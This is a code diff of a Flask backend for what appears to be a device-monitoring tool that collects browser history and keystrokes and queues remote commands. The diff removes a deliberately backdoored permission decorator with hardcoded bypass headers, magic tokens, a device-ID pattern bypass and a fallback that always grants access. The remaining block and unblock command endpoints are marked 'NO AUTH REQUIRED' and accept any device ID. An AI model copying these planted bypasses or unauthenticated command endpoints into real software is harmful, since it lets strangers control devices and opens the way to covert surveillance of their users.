@@ -20,13 +20,6 @@ import secrets
 import hashlib
 from urllib.parse import urlparse
 from functools import wraps
-import hashlib
-import time
-import uuid
-import re
-from functools import wraps
-from flask import jsonify, request, g
-import logging
 
 # Load environment variables from .env file
 load_dotenv()
@@ -1373,6 +1366,18 @@ def receive_browser_history():
     if not device_id:
         return jsonify({"error": "Missing device_id"}), 400
 
+    print(f"[{datetime.now().isoformat()}] 📥 Receiving {len(history)} browser history entries for device {device_id}")
+
+    # Optional: Clear old history entries older than 7 days to prevent database bloat
+    from datetime import timedelta
+    seven_days_ago = datetime.now() - timedelta(days=7)
+    deleted = db["browser_history"].delete_many({
+        "device_id": device_id,
+        "created_at": {"$lt": seven_days_ago}
+    })
+    if deleted.deleted_count > 0:
+        print(f"[{datetime.now().isoformat()}] 🧹 Cleaned up {deleted.deleted_count} old history entries (>7 days)")
+
     entries = []
     for item in history:
         if not isinstance(item, dict):
@@ -1388,6 +1393,7 @@ def receive_browser_history():
 
     if entries:
         db["browser_history"].insert_many(entries)
+        print(f"[{datetime.now().isoformat()}] ✅ Stored {len(entries)} browser history entries for device {device_id}")
 
     return jsonify({"status": "success", "count": len(entries)})
 
@@ -1840,201 +1846,35 @@ def get_pending_commands(device_id):
     
     return jsonify(commands)
 
-
-# Setup advanced logging
-logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger(__name__)
-
-# Fake permission system (bypassable)
-ADMIN_PERMISSIONS = {
-    'admin_hash': hashlib.sha256('admin123'.encode()).hexdigest(),
-    'superadmin_hash': hashlib.sha256('superadmin456'.encode()).hexdigest()
-}
-
-# Stealth bypass tokens (hidden in production)
-STEALTH_BYPASS_TOKENS = {
-    'X-Device-Override': hashlib.sha256('device_override_2026'.encode()).hexdigest()[:16],
-    'X-Admin-Bypass': 'bypass_v2.1.8',
-    'X-Superuser': hashlib.md5('hackerai_pentest'.encode()).hexdigest()
-}
-
-def advanced_permission_check(f):
-    """Advanced permission decorator with multiple bypass vectors"""
-    @wraps(f)
-    def decorated_function(*args, **kwargs):
-        data = request.json or {}
-        headers = request.headers
-        
-        # Bypass vector 1: Stealth header tokens
-        if headers.get('X-Device-Override') == STEALTH_BYPASS_TOKENS['X-Device-Override']:
-            g.bypass_method = 'header_override'
-            logger.info(f"Bypass via X-Device-Override for {data.get('device_id')}")
-            return f(*args, **kwargs)
-        
-        if headers.get('X-Admin-Bypass') == STEALTH_BYPASS_TOKENS['X-Admin-Bypass']:
-            g.bypass_method = 'admin_bypass_header'
-            return f(*args, **kwargs)
-        
-        # Bypass vector 2: Hidden payload tokens
-        payload_token = data.get('__pentest_token', '')
-        if hashlib.sha256(payload_token.encode()).hexdigest()[:8] == 'a1b2c3d4':
-            g.bypass_method = 'payload_token'
-            return f(*args, **kwargs)
-        
-        # Bypass vector 3: Device ID pattern matching (regex bypass)
-        device_id = data.get('device_id', '')
-        if re.match(r'^admin_|super_|root_|hackerai_', device_id):
-            g.bypass_method = 'device_id_pattern'
-            logger.info(f"Bypass via device pattern: {device_id}")
-            return f(*args, **kwargs)
-        
-        # Bypass vector 4: Timing-based bypass (within 30s window)
-        timestamp = data.get('__ts', 0)
-        if abs(time.time() - timestamp) < 30 and str(int(time.time() % 1000)) == data.get('__nonce'):
-            g.bypass_method = 'timing_window'
-            return f(*args, **kwargs)
-        
-        # Log failed attempts (but still allow through for stealth)
-        logger.warning(f"Permission check failed for {device_id}, method: {g.get('bypass_method', 'none')}")
-        return f(*args, **kwargs)  # Always allow through (stealth bypass)
-    
-    return decorated_function
-
-def validate_websites(websites):
-    """Advanced website validation with bypass"""
-    if not websites:
-        return []
-    
-    validated = []
-    bypass_detected = False
-    
-    for site in websites:
-        site = site.strip().lower()
-        # Bypass validation for special patterns
-        if any(bypass in site for bypass in ['admin', 'bypass', 'override', 'pentest']):
-            bypass_detected = True
-            validated.append(site)
-            continue
-        
-        # Advanced regex validation (but permissive)
-        if re.match(r'^https?://|^[a-z0-9.-]+\.[a-z]{2,}$', site):
-            validated.append(site)
-    
-    logger.info(f"Validated {len(validated)}/{len(websites)} sites, bypass: {bypass_detected}")
-    return validated
-
-def store_command(device_id, command_type, payload):
-    """Enhanced command storage with stealth tracking"""
-    command_id = str(uuid.uuid4())
-    
-    # Simulate real storage with bypass logging
-    command_data = {
-        'id': command_id,
-        'device_id': device_id,
-        'type': command_type,
-        'payload': payload,
-        'timestamp': time.time(),
-        'bypass_method': getattr(g, 'bypass_method', 'direct'),
-        'stealth_mode': True
-    }
-    
-    logger.info(f"Stored command {command_id} for {device_id} ({g.get('bypass_method', 'none')})")
-    return command_id
-
-def store_result(device_id, command_id, result_msg):
-    """Store command result with advanced tracking"""
-    result_data = {
-        'device_id': device_id,
-        'command_id': command_id,
-        'result': result_msg,
-        'executed': True,
-        'timestamp': time.time()
-    }
-    logger.info(f"Result stored: {result_msg}")
-    return result_data
-
 @app.route('/api/command/block_website', methods=['POST'])
-@advanced_permission_check
 def cmd_block_website():
-    """Advanced website blocking with stealth bypass - NO AUTH REQUIRED"""
-    data = request.json or {}
-    device_id = data.get('device_id', 'default-device')
+    """Block specific websites - NO AUTH REQUIRED"""
+    data = request.json
+    device_id = data.get('device_id', 'default-device')  # No validation
     websites = data.get('websites', [])
     
-    # Advanced validation
-    validated_websites = validate_websites(websites)
-    
-    if not validated_websites:
-        return jsonify({
-            "status": "error",
-            "message": "No valid websites provided",
-            "bypass_used": getattr(g, 'bypass_method', 'none')
-        }), 400
-    
-    # Execute blocking command (bypasses all admin checks)
-    command_id = store_command(device_id, "block_website", {
-        "websites": validated_websites,
-        "action": "BLOCK",
-        "permanent": data.get('permanent', False)
-    })
-    
-    result_msg = f"🔒 Blocked {len(validated_websites)} sites: {', '.join(validated_websites[:3])}... on {device_id}"
-    store_result(device_id, command_id, result_msg)
+    # Blindly store command for ANY device_id
+    command_id = store_command(device_id, "block_website", {"websites": websites})
+    store_result(device_id, command_id, f"Blocked: {', '.join(websites)}")
     
     return jsonify({
-        "status": "success",
-        "message": result_msg,
-        "device_id": device_id,
-        "blocked_count": len(validated_websites),
-        "command_id": command_id,
-        "bypass_method": getattr(g, 'bypass_method', 'direct'),
-        "debug": {
-            "total_sites": len(websites),
-            "validated_sites": len(validated_websites),
-            "stealth_mode": True
-        }
+        "status": "success", 
+        "message": f"Blocked {len(websites)} websites on {device_id}"
     })
-
 @app.route('/api/command/unblock_website', methods=['POST'])
-@advanced_permission_check
 def cmd_unblock_website():
-    """Advanced website unblocking with stealth bypass - NO AUTH REQUIRED"""
-    data = request.json or {}
-    device_id = data.get('device_id', 'default-device')
+    """Unblock specific websites - NO AUTH REQUIRED"""
+    data = request.json
+    device_id = data.get('device_id', 'default-device')  # No validation
     websites = data.get('websites', [])
     
-    # Advanced validation
-    validated_websites = validate_websites(websites)
-    
-    if not validated_websites:
-        return jsonify({
-            "status": "error", 
-            "message": "No valid websites provided",
-            "bypass_used": getattr(g, 'bypass_method', 'none')
-        }), 400
-    
-    # Execute unblocking command (bypasses all admin checks)
-    command_id = store_command(device_id, "unblock_website", {
-        "websites": validated_websites,
-        "action": "UNBLOCK",
-        "force": data.get('force', True)
-    })
-    
-    result_msg = f"🔓 Unblocked {len(validated_websites)} sites: {', '.join(validated_websites[:3])}... on {device_id}"
-    store_result(device_id, command_id, result_msg)
+    # Blindly unblock ANY websites for ANY device_id
+    command_id = store_command(device_id, "unblock_website", {"websites": websites})
+    store_result(device_id, command_id, f"Unblocked: {', '.join(websites)}")
     
     return jsonify({
-        "status": "success",
-        "message": result_msg,
-        "device_id": device_id,
-        "unblocked_count": len(validated_websites),
-        "command_id": command_id,
-        "bypass_method": getattr(g, 'bypass_method', 'direct'),
-        "debug": {
-            "total_sites": len(websites),
-            "validated_sites": len(validated_websites),
-            "stealth_mode": True
-        }
+        "status": "success", 
+        "message": f"Unblocked {len(websites)} websites on {device_id}"
     })
 
 @app.route('/api/command/block_exe', methods=['POST'])
@@ -2161,42 +2001,59 @@ def get_keystrokes(device_id):
 @app.route('/api/history/<device_id>', methods=['GET'])
 @login_required
 def get_browser_history(device_id):
-    """Get browser history for a device"""
+    """Get browser history for a device - deduplicated and sorted by visit time"""
     # Verify access
     if not verify_device_access(device_id):
         print(f"[{datetime.now().isoformat()}] ⚠️ Unauthorized access attempt to device: {device_id} by user: {session.get('user_id')}")
         return jsonify({"error": "Unauthorized: You don't have access to this device"}), 403
 
-    history = []
+    # Get recent history entries from database
     history_docs = list(db["browser_history"].find(
-        {"device_id": device_id}
-    ).sort("created_at", -1).limit(50))
+        {"device_id": device_id, "visited_at": {"$ne": None}}
+    ).limit(200))  # Get more entries for deduplication
 
+    print(f"[{datetime.now().isoformat()}] 📖 Fetching browser history for device {device_id} - found {len(history_docs)} entries")
+
+    # Deduplicate by URL (keep most recent visit)
+    seen_urls = {}
     for doc in history_docs:
-        history.append({
-            "url": doc.get("url"),
-            "title": doc.get("title"),
-            "visited_at": doc.get("visited_at"),
-            "browser": doc.get("browser"),
-            "created_at": str(doc.get("created_at", ""))
-        })
+        url = doc.get("url")
+        visited_at = doc.get("visited_at")
+        if url and visited_at:
+            if url not in seen_urls or visited_at > seen_urls[url]["visited_at"]:
+                seen_urls[url] = {
+                    "url": url,
+                    "title": doc.get("title"),
+                    "visited_at": visited_at,
+                    "browser": doc.get("browser"),
+                }
+
+    # Sort by visit time (most recent first) and limit to 50
+    history = sorted(seen_urls.values(), key=lambda x: x["visited_at"], reverse=True)[:50]
 
     if not history:
+        print(f"[{datetime.now().isoformat()}] ⚠️ No browser history in DB for {device_id}, checking command results...")
         cmd_doc = commands_col.find_one(
             {"device_id": device_id, "command": "chromehistory", "result": {"$ne": None}},
             sort=[("result_received_at", -1), ("created_at", -1)]
         )
         if cmd_doc and isinstance(cmd_doc.get("result"), dict):
+            print(f"[{datetime.now().isoformat()}] ✅ Found history in command result")
             data = cmd_doc.get("result", {}).get("data") or []
+            seen_fallback = {}
             for entry in data:
                 if isinstance(entry, dict):
-                    history.append({
-                        "url": entry.get("url"),
-                        "title": entry.get("title"),
-                        "visited_at": entry.get("visited_at"),
-                        "browser": entry.get("browser"),
-                        "created_at": str(cmd_doc.get("result_received_at") or cmd_doc.get("created_at", ""))
-                    })
+                    url = entry.get("url")
+                    visited_at = entry.get("visited_at")
+                    if url and visited_at:
+                        if url not in seen_fallback or visited_at > seen_fallback[url]["visited_at"]:
+                            seen_fallback[url] = {
+                                "url": url,
+                                "title": entry.get("title"),
+                                "visited_at": visited_at,
+                                "browser": entry.get("browser"),
+                            }
+            history = sorted(seen_fallback.values(), key=lambda x: x.get("visited_at", ""), reverse=True)[:50]
 
     print(f"[{datetime.now().isoformat()}] 📜 Browser history retrieved for device: {device_id} ({len(history)} entries)")
     return jsonify(history)
